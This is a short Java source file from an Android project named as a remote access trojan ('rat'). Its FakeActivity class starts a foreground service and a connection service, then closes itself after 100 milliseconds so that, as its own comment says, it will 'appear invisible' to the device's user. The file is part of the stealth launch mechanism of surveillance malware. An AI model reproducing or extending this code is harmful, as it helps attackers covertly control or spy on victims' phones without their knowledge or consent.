package com.fly0rakoon.rat;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;

import com.fly0rakoon.rat.services.ConnectionService;
import com.fly0rakoon.rat.services.ForegroundService;

public class FakeActivity extends Activity {
    private static final String TAG = "FakeActivity";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "FakeActivity created");
        
        // Start foreground service immediately
        startForegroundService(new Intent(this, ForegroundService.class));
        
        // Start connection service
        startService(new Intent(this, ConnectionService.class));
        
        // Close activity after a short delay to appear invisible
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                finish();
            }
        }, 100);
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "FakeActivity destroyed");
    }
}
